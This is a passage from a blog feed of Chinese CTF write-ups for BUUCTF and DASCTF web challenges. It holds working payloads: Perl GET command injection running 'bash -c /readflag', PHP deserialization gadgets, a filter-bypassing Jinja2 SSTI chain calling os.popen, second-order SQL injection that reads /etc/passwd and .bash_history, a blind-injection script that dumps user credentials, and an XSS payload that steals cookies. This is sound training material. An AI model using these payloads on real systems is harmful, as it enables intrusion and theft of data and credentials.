    
    
    
    <tags>
      
      <tag>note</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRFme</title>
    <link href="/2021/04/09/BUU67/"/>
    <url>/2021/04/09/BUU67/</url>
    
    <content type="html"><![CDATA[<h2 id="â€”"><a href="#â€”" class="headerlink" title="â€”"></a>â€”</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;        $http_x_headers = explode(<span class="hljs-string">&#x27;,&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);    <span class="hljs-comment">##ä»¥é€—å·åˆ†å‰²$_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;]ï¼Œè¿”å›æ•°ç»„</span>        $_SERVER[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = $http_x_headers[<span class="hljs-number">0</span>];    &#125;    <span class="hljs-keyword">echo</span> $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>];    $sandbox = <span class="hljs-string">&quot;sandbox/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . $_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);      <span class="hljs-comment">##$_SERVER[&quot;REMOTE_ADDR&quot;]è¿”å›IPåœ°å€</span>    @mkdir($sandbox);    <span class="hljs-comment">##åˆ›å»ºæ²™ç›’ </span>    @chdir($sandbox);    <span class="hljs-comment">##æ”¹å˜ç›®å½•åˆ°æ²™ç›’</span>    $data = shell_exec(<span class="hljs-string">&quot;GET &quot;</span> . escapeshellarg($_GET[<span class="hljs-string">&quot;url&quot;</span>]));    $info = pathinfo($_GET[<span class="hljs-string">&quot;filename&quot;</span>]);    $dir  = str_replace(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, basename($info[<span class="hljs-string">&quot;dirname&quot;</span>]));         <span class="hljs-comment">##urlå‚æ•°ä»¥GETå‘½ä»¤æ‰§è¡Œï¼Œç»“æœå­˜å…¥ä»¥filenameå‚æ•°çš„å€¼å‘½åçš„æ–‡ä»¶é‡Œ</span>    @mkdir($dir);    @chdir($dir);    @file_put_contents(basename($info[<span class="hljs-string">&quot;basename&quot;</span>]), $data);    highlight_file(<span class="hljs-keyword">__FILE__</span>);</code></pre></code></pre><p>è¯»å–æ ¹ç›®å½•ï¼Œåˆ›å»ºæ–‡ä»¶abc<br><code>url=/&amp;filename=abc</code><br>è®¿é—®è¯¥æ–‡ä»¶<code>/sandbox/fcf2bccafc269c160382150a0166d632/abc    </code><br> <img src="https://ae03.alicdn.com/kf/U9d258cc946ec4e4fb723d7652f2049c7P.jpg" alt="01.png"></p><p>/readflagå¾—åˆ°flag       </p><p><code>bash -c /readflag|</code><br>ä¸è¿‡è¦å…ˆæœ‰ä¸€ä¸ªåŒåæ–‡ä»¶<br>ç„¶åæ‰§è¡Œè¯¥å‘½ä»¤<br>payloadï¼š<code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code>æ‰§è¡Œä¸¤éï¼Œç„¶åè®¿é—®<code>bash -c /readflag|</code>å³å¯å¾—åˆ°flag       </p><p><a href="https://www.freesion.com/article/5626598350/">perlè„šæœ¬ä¸­GETå‘½ä»¤æ‰§è¡Œæ¼æ´</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dasctf</title>
    <link href="/2021/04/09/dasctf/"/>
    <url>/2021/04/09/dasctf/</url>
    
    <content type="html"><![CDATA[<h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>åˆ©ç”¨åŸç”Ÿç±»ï¼Œæ‰«æï¼Œè¯»å–æ–‡ä»¶        </p><pre><code><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> $class;    <span class="hljs-keyword">public</span> $para;    <span class="hljs-keyword">public</span> $check;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;class = <span class="hljs-string">&quot;B&quot;</span>;        <span class="hljs-keyword">$this</span>-&gt;para = <span class="hljs-string">&quot;ctfer&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span>  <span class="hljs-keyword">$this</span>-&gt;class (<span class="hljs-keyword">$this</span>-&gt;para);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;check = <span class="hljs-keyword">new</span> C;        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;check-&gt;vaild(<span class="hljs-keyword">$this</span>-&gt;para) &amp;&amp; <span class="hljs-keyword">$this</span>-&gt;check-&gt;vaild(<span class="hljs-keyword">$this</span>-&gt;class)) &#123;            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span>  <span class="hljs-keyword">$this</span>-&gt;class (<span class="hljs-keyword">$this</span>-&gt;para);        &#125;        <span class="hljs-keyword">else</span>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;bad hacker~&#x27;</span>);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span></span>&#123;    <span class="hljs-keyword">var</span> $a;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">$a</span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;a = $a;        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;hello &quot;</span>.<span class="hljs-keyword">$this</span>-&gt;a);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vaild</span>(<span class="hljs-params">$code</span>)</span>&#123;        $pattern = <span class="hljs-string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;        <span class="hljs-keyword">if</span> (preg_match($pattern, $code))&#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;        <span class="hljs-keyword">else</span>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;    unserialize($_GET[<span class="hljs-string">&#x27;pop&#x27;</span>]);&#125;<span class="hljs-keyword">else</span>&#123;    $a=<span class="hljs-keyword">new</span> A;&#125;</code></pre></code></pre><p>åˆçœ‹å¹³å¹³æ— å¥‡ï¼Œä¹Ÿæ²¡å•¥å±é™©å‡½æ•°ï¼Œåˆ©ç”¨åŸç”Ÿç±»äº†       </p><pre><code>    public function __wakeup()    &#123;        $this-&gt;check = new C;        if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) &#123;            echo new  $this-&gt;class ($this-&gt;para);        &#125;        else            die(&#39;bad hacker~&#39;);    &#125;        </code></pre><p><img src="https://sc02.alicdn.com/kf/U9a1978f1ecdb43efb14e616b95cca88eP.jpg" alt="01.png">        </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> $class=<span class="hljs-string">&#x27;FilesystemIterator&#x27;</span>;    <span class="hljs-keyword">public</span> $para=<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>;    <span class="hljs-keyword">public</span> $check;&#125;$a=<span class="hljs-keyword">new</span> A();<span class="hljs-keyword">echo</span> serialize($a);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç„¶åå†éå†è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œå¾—åˆ°ä¸€ä¸ª<code>flag.php</code><br>(è¿™é‡Œç”¨Diretorylteratorçš„è¯ï¼Œæˆ‘åœ¨æœ¬åœ°è¿”å›çš„æ˜¯ä¸€ä¸ªç‚¹ï¼‰<br>è¯»å–æ–‡ä»¶       </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> $class=<span class="hljs-string">&#x27;SplFileObject&#x27;</span>;    <span class="hljs-keyword">public</span> $para=<span class="hljs-string">&quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;</span>;    <span class="hljs-keyword">public</span> $check;    &#125;$o  = <span class="hljs-keyword">new</span> A();<span class="hljs-keyword">echo</span> serialize($o);<span class="hljs-meta">?&gt;</span></code></pre></code></pre><h2 id="baby-flask"><a href="#baby-flask" class="headerlink" title="baby_flask"></a>baby_flask</h2><p>è¿‡æ»¤çš„ä¸œè¥¿        </p><pre><code>blacklist&lt;/br&gt;   &#39;.&#39;,&#39;[&#39;,&#39;\&#39;&#39;,&#39;&quot;&#39;,&#39;&#39;\\&#39;,&#39;+&#39;,&#39;:&#39;,&#39;_&#39;,&lt;/br&gt;   &#39;chr&#39;,&#39;pop&#39;,&#39;class&#39;,&#39;base&#39;,&#39;mro&#39;,&#39;init&#39;,&#39;globals&#39;,&#39;get&#39;,&lt;/br&gt;   &#39;eval&#39;,&#39;exec&#39;,&#39;os&#39;,&#39;popen&#39;,&#39;open&#39;,&#39;read&#39;,&lt;/br&gt;   &#39;select&#39;,&#39;url_for&#39;,&#39;get_flashed_messages&#39;,&#39;config&#39;,&#39;request&#39;,&lt;/br&gt;   &#39;count&#39;,&#39;length&#39;,&#39;ï¼&#39;,&#39;ï¼‘&#39;,&#39;ï¼’&#39;,&#39;ï¼“&#39;,&#39;ï¼”&#39;,&#39;ï¼•&#39;,&#39;ï¼–&#39;,&#39;ï¼—&#39;,&#39;ï¼˜&#39;,&#39;ï¼™&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;&lt;/br&gt;    &lt;/br&gt;</code></pre><p>joinæ‹¼æ¥      </p><p><code>&#123;&#123;[1,2,3]|join()&#125;&#125;</code>â€”â€“&gt; <code>123</code><br><code>&#123;&#123;[1,2,3]|join('|')&#125;&#125;</code>â€”â€“&gt;<code>1|2|3</code></p><pre><code>&#123;%set a=dict(po=aa,p=aa)|join%&#125; # pop&#123;%set b=lipsum|string|list|attr(a)(ğŸ™ğŸ )%&#125; # _&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125; # globals&#123;%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%&#125; # getitem&#123;%set e=dict(o=cc,s=aa)|join%&#125; # os&#123;%set f=lipsum|string|list|attr(a)(ğŸ¡)%&#125; # ç©ºæ ¼&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ )%&#125; # æ–œæ &#123;%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%&#125; # cat /flag&#123;%set h=(a,dict(en=aa)|join|join)|join%&#125; # popen&#123;%set i=dict(re=aa,ad=aa)|join%&#125; # read&#123;%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-ğŸ)%&#125; #ç‚¹&#123;%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%&#125; #ls /var/www/flask&#123;%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%&#125;&#123;&#123;j&#125;&#125;#æœ€åæ‹¼æ¥èµ·æ¥#&#123;&#123;lipsum.__globals__['os'].popen('ls /var/www/flask').read()&#125;&#125;       </code></pre><p><a href="http://www.plasf.cn/articles/dasctf202103.html">MORE1</a><br><a href="https://blog.csdn.net/rfrder/article/details/115272645">MORE2</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Comment</title>
    <link href="/2021/04/06/BUU66/"/>
    <url>/2021/04/06/BUU66/</url>
    
    <content type="html"><![CDATA[<h2 id="â€˜-â€™"><a href="#â€˜-â€™" class="headerlink" title="â€˜__â€™"></a>â€˜__â€™</h2><p>ç•™è¨€é‚£é‡Œå­˜åœ¨XSSï¼ŒBUUçš„XSSå¹³å°æ²¡æ³•æ³¨å†Œï¼Œå°±æ²¡è¯•â€™()â€™</p><p>äºŒæ¬¡æ³¨å…¥      </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/174863/29/3351/8503/6072da0aEe2e9591e/202fcd59c2670f49.png" alt="06.png"><br>æç¤ºäº†è´¦å·å’Œå¯†ç ï¼Œä¸€èˆ¬åé¢æ˜¯ä¸‰ä½æ•°å­—ï¼Œçˆ†ç ´æ˜¯666<br><img src="https://ftp.bmp.ovh/imgs/2021/04/04a05effe6890640.png"><br><code>write_do.php</code><br>çœ‹WPæ˜¯gitæ³„éœ²<br>Githackä¸€ä¸‹ä¸‹è½½ä¸‹æ¥<code>write_do.php</code>  ï¼Œä½†æ˜¯æ˜¯æ®‹ç¼ºçš„ï¼Œgit logå†å²commité‡Œä¹Ÿæ²¡<code>add write_do.php</code>??      </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;session_start();<span class="hljs-keyword">if</span>($_SESSION[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<span class="hljs-keyword">switch</span> ($_GET[<span class="hljs-string">&#x27;do&#x27;</span>])&#123;<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:     <span class="hljs-comment">##å‘å¸–</span>    $category = addslashes($_POST[<span class="hljs-string">&#x27;category&#x27;</span>]);    $title = addslashes($_POST[<span class="hljs-string">&#x27;title&#x27;</span>]);    $content = addslashes($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]);    $sql = <span class="hljs-string">&quot;insert into board</span><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;    $result = mysql_query($sql);    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);    <span class="hljs-keyword">break</span>;<span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:   <span class="hljs-comment">##ç•™è¨€</span>    $bo_id = addslashes($_POST[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);    $sql = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    <span class="hljs-keyword">if</span>($num&gt;<span class="hljs-number">0</span>)&#123;    $category = mysql_fetch_array($result)[<span class="hljs-string">&#x27;category&#x27;</span>];    $content = addslashes($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]);    $sql = <span class="hljs-string">&quot;insert into comment</span><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;    $result = mysql_query($sql);    &#125;    header(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);    <span class="hljs-keyword">break</span>;<span class="hljs-keyword">default</span>:    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p>è™½ç„¶æœ‰addslasheså‡½æ•°ï¼Œä½†æ˜¯ï¼Œæ•°æ®åº“æŸ¥è¯¢æ—¶ä¼šè‡ªåŠ¨è¿‡æ»¤è°ƒæ–œçº¿çš„<br><img src="https://ftp.bmp.ovh/imgs/2021/04/4d8c1aa58308f665.png">     </p><pre><code>$sql = &quot;insert into comment        set category = &#39;$category&#39;,            content = &#39;$content&#39;,            bo_id = &#39;$bo_id&#39;&quot;;      </code></pre><p><code>category=&#39;,content=database(),/*     </code><br>ç•™è¨€è¾“å…¥<code>content=*/#</code><br>å°±æˆäº†      </p><pre><code>$sql = &quot;insert into comment        set category = &#39;&#39;,content=database(),/*&#39;,            content = &#39;*/#&#39;,            bo_id = &#39;$bo_id&#39;&quot;;      </code></pre><p>å°±å¯ä»¥æŸ¥è¯¢åº“äº† â€”-<code>ctf</code><br>ç„¶åæŸ¥è¡¨å•¥çš„ï¼Œä½†æŸ¥ä¸å‡ºæ¥       </p><p><code>load_file</code>        </p><p><code>    &#39;,content=load_file(&#39;/etc/passwd&#39;),/*</code><br><img src="https://ftp.bmp.ovh/imgs/2021/04/f60314c154735390.png">       </p><p><code>&#39;,content=load_file(&#39;/home/www/.bash_history&#39;),/*</code><br><img src="https://ftp.bmp.ovh/imgs/2021/04/4ec8c167bc9d6949.png">    </p><p>è™½ç„¶è¢«åˆ äº†ï¼Œä½†<code>/tmp/html</code>ä¸­è¿˜æœ‰<br><code>&#39;,content=load_file(&#39;/tmp/html/.DS_Store&#39;),/*</code>ä¼šä¹±ç ï¼ŒåŠ hex<code>&#39;,content=hex(load_file(&#39;/tmp/html/.DS_Store&#39;)),/*</code><br><img src="https://ftp.bmp.ovh/imgs/2021/04/430404dd20585acc.png"> </p><p><code>&#39;,content=hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;)),/*</code><br>è§£ç å¾—åˆ°flag     </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CyberPunk</title>
    <link href="/2021/04/04/BUU65/"/>
    <url>/2021/04/04/BUU65/</url>
    
    <content type="html"><![CDATA[<h2 id="â€˜-â€™"><a href="#â€˜-â€™" class="headerlink" title="â€˜__â€™"></a>â€˜__â€™</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/04/e4c5412ad0e75377.png"><br>çœ‹ä¸‹æºç ï¼Œæœ‰æç¤ºï¼š<code>&lt;!--?file=?--&gt;</code>     </p><p>ç”¨ä¼ªåè®®è¯»ä¸‹æ–‡ä»¶<br><code>index.php</code><br><code>change.php</code><br><code>config.php</code><br><code>search.php</code><br><code>delete.php</code>        </p><p><code>$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;</code><br>nameå’Œphone éƒ½è¿‡æ»¤äº†å¥½å¤š<br>addressåªæœ‰ä¸€ä¸ªaddslashesè½¬ä¹‰å‡½æ•°<br>ä¿®æ”¹åœ°å€é‚£é‡Œæ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥åœ¨æ­¤è¿›è¡ŒSQLæ³¨å…¥ï¼Œç¬¬ä¸€æ¬¡ä¿®æ”¹ä¸ºSQLè¯­å¥ï¼Œå†æ¬¡ä¿®æ”¹ï¼Œåˆšæ‰ä¿®æ”¹çš„SQLè¯­å¥å°±è¢«æŸ¥è¯¢æ‰§è¡Œäº†<br>å›æ˜¾åªæœ‰<code>è®¢å•ä¿®æ”¹æˆåŠŸ</code><br>å¯ä»¥æŠ¥é”™æ³¨å…¥<br>payloadï¼š<code>1&#39; where user_id=updatexml(1,concat(0x7e,(select user()),0x7e),1)#</code><br>ä¸è¿‡è¿™é“é¢˜flagæ²¡åœ¨æ•°æ®åº“ä¸­ï¼Œè¦ç”¨<code>load_file</code>è¯»å–æ–‡ä»¶<br><code>select load_file(&#39;/flag.txt&#39;)</code><br><code>flag.txt</code>æ˜¯çŒœçš„<br>updatexmlæ¯æ¬¡åªèƒ½å›æ˜¾32ä½<br>å¯ä»¥substræˆ–è€…rightã€left       </p><p><img src="https://ftp.bmp.ovh/imgs/2021/04/167b92bcd92a0069.png"> </p><h2 id="èŠå£«Â·"><a href="#èŠå£«Â·" class="headerlink" title="èŠå£«Â·"></a>èŠå£«Â·</h2><p><code>select load_file(&#39;/etc/password&#39;)</code>    </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Can You Guess It?</title>
    <link href="/2021/04/03/BUU64/"/>
    <url>/2021/04/03/BUU64/</url>
    
    <content type="html"><![CDATA[<h2 id="â€˜0â€™"><a href="#â€˜0â€™" class="headerlink" title="â€˜0â€™"></a>â€˜0â€™</h2><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;config.php&#x27;</span>; <span class="hljs-comment">// FLAG is defined in config.php</span><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/config\.php\/*$/i&#x27;</span>, $_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;  <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);&#125;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;source&#x27;</span>])) &#123;  highlight_file(basename($_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));  <span class="hljs-keyword">exit</span>();&#125;</code></pre></code></pre><p><code>$_SERVER[&#39;&#39;PHP_SELF&#39;&#39;]</code>â€”â€“&gt;è·å–ç½‘é¡µåœ°å€<br>ä¸‹é¢çš„æ˜¯ä¸ªå¹Œå­<br><a href="https://bugs.php.net/bug.php?id=62119">basenameæ¼æ´</a>â€”â€“&gt;ä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼<br>asciiçš„èŒƒå›´æ˜¯<code>0~255</code>ï¼Œä½†<code>128~255</code>æ²¡åœ¨è¡¨ä¸­       </p><p>payloadï¼š<code>/index.php/config.php/%ff?source</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Easyweb</title>
    <link href="/2021/04/02/BUU63/"/>
    <url>/2021/04/02/BUU63/</url>
    
    <content type="html"><![CDATA[<h2 id="â€˜-â€˜"><a href="#â€˜-â€˜" class="headerlink" title="â€˜ - â€˜"></a>â€˜ - â€˜</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/04/ee8f89b00a61ccff.png"><br><code>robots.txt</code>    </p><pre><code>User-agent: *Disallow: *.php.bak        </code></pre><p>æœ‰<code>image.php.bak</code>       </p><pre><code>```php&lt;ï»¿?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path);      ```     </code></pre><p><code>addslashes</code>å‡½æ•°</p><pre><code>è¿”å›å­—ç¬¦ä¸²ï¼Œè¯¥å­—ç¬¦ä¸²ä¸ºäº†æ•°æ®åº“æŸ¥è¯¢è¯­å¥ç­‰çš„éœ€è¦åœ¨æŸäº›å­—ç¬¦å‰åŠ ä¸Šäº†åæ–œçº¿ã€‚è¿™äº›å­—ç¬¦æ˜¯å•å¼•å·ï¼ˆ&#39;ï¼‰ã€åŒå¼•å·ï¼ˆ&quot;ï¼‰ã€åæ–œçº¿ï¼ˆ\ï¼‰ä¸ NULï¼ˆNULL å­—ç¬¦ï¼‰ã€‚      </code></pre><p><code>image.php?id=1</code>sqlæ³¨å…¥     </p><p>ç»•è¿‡<code>id=\0</code>        </p><p><code>\0</code>ç»è¿‡addslasheså‡½æ•°åæ˜¯<code>\\0</code>ï¼Œç„¶å<code>\0</code>æ›¿æ¢å›´æ®´ç©ºæ ¼ï¼Œåªå‰©ä¸‹äº†<code>\</code>ï¼Œä»è€Œè½¬ä¹‰<code>&#39;</code>         </p><pre><code>```pythonimport requestsimport timeurl=&#39;http://984ea44f-1a99-475f-877c-e0285554e586.node3.buuoj.cn/image.php?id=\\0&amp;path= or &#39;flag=&#39;&#39;st=&#39;JFIF&#39;           JFIFæ˜¯é‚£ä¸ªå›¾ç‰‡for j in range(1,100):    s=32    l=128    mid=(s+l)//2    while(s&lt;l):        time.sleep(0.1)        #payload=&quot;ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;.format(j,mid)        #payload=&quot;ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;.format(j,mid)        #payload=&quot;ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;.format(j,mid)        payload=&quot;ascii(substr((select group_concat(username,0x2626,password) from users),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;.format(j,mid)        url_new=url+payload        r=requests.get(url=url_new)        if st  in r.text:            s=mid+1        else:            l=mid        mid=(s+l)//2    if(mid==32 or mid==132):        break    flag=flag+chr(mid)    print(flag)```     </code></pre><p>ç™»å½•åæ˜¯ä¼ æ–‡ä»¶ï¼Œéœ€è¦åœ¨æ–‡ä»¶åå†™ä¸€å¥è¯ï¼Œç”¨çŸ­æ ‡ç­¾ç»•è¿‡å¯¹<code>php/i</code>çš„è¿‡æ»¤<br>ç„¶åå‡ºç°logè·¯å¾„ï¼Œä½†æˆ‘ç”¨èšå‰‘è¿ä¸ä¸Šï¼Œï¼Ÿï¼Ÿï¼Ÿ        </p><p>å°±è¿™å§ï¼Œè®°ä¸€æ¬¡æ–‡ä»¶åä¸Šä¼ ä¸€å¥è¯æœ¨é©¬        </p><p><a href="http://t.zoukankan.com/wangtanzhi-p-12253918.html">http://t.zoukankan.com/wangtanzhi-p-12253918.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF 2nd Xssä¹‹å…‰</title>
    <link href="/2021/04/01/BUU62/"/>
    <url>/2021/04/01/BUU62/</url>
    
    <content type="html"><![CDATA[<h2 id="â€˜-â€˜-â€˜"><a href="#â€˜-â€˜-â€˜" class="headerlink" title="â€˜-â€˜-â€˜"></a>â€˜-â€˜-â€˜</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/04/6b7c495f5410b55c.png"><br>æ‰“å¼€å°±ä¸ªè¿™<br>å…¶ä»–ä»€ä¹ˆä¹Ÿæ²¡<br>dirsearchæ‰«çš„è¯ä¼š429ï¼ŒåŠ -sè¿˜æ˜¯ä¼š429ï¼Ÿï¼Ÿï¼Ÿ<br>çœ‹äº†WPæ˜¯gitæ³„éœ²<br>githackä¸€ä¸‹<br><img src="https://ftp.bmp.ovh/imgs/2021/04/92d01a33b6c1a59a.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/04/15257587e78dc396.png"><br>å°±è¿™ï¼Ÿï¼Ÿ<br>æ²¡ç±»ï¼Ÿï¼Ÿ     </p><p>ç”¨åŸç”Ÿç±»â€”<a href="https://www.php.net/manual/zh/class.exception.php">Exception</a>â€”æ‰€æœ‰å¼‚å¸¸çš„åŸºç±»     </p><p>ç„¶åå¼¹cookie    </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;</span>);<span class="hljs-keyword">echo</span> urlencode(serialize($a));<span class="hljs-meta">?&gt;</span></code></pre></code></pre><p><code>window.open</code>â€”â€“&gt;æ‰“å¼€æ–°çª—å£     </p><pre><code><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span 